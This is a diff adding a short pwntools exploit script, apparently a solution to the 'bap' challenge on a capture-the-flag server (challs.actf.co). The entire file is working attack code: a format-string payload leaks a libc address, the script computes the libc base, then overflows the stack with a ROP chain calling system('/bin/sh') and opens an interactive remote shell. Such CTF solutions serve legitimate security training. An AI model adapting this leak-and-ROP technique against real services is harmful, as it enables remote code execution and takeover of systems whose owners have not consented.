@@ -1,0 +1,21 @@
+from pwn import *
+context.binary = e = ELF('./bap')
+libc = ELF('./libc.so.6')
+#r = process('./bap_patched')
+#r = gdb.debug('./bap_patched')
+r = remote('challs.actf.co', 31323)
+r.recvuntil(b': ')
+payload = b'%3$p!'.ljust(0x10+0x8, b'a')
+payload += p64(0x00000000004011CE) + p64(e.sym['main'])
+r.sendline(payload)
+libc_leak = int(r.recvuntil(b'!', drop=True), 16)
+libc.address = libc_leak - 0x219aa0
+r.recvuntil(b': ')
+rop = ROP(libc)
+rop.raw(b'a'*(0x10+0x8))
+rop.raw(p64(0x00000000004011CE))
+rop.system(next(libc.search(b'/bin/sh\x00')))
+print(rop.dump())
+r.sendline(rop.chain())
+r.interactive()
+
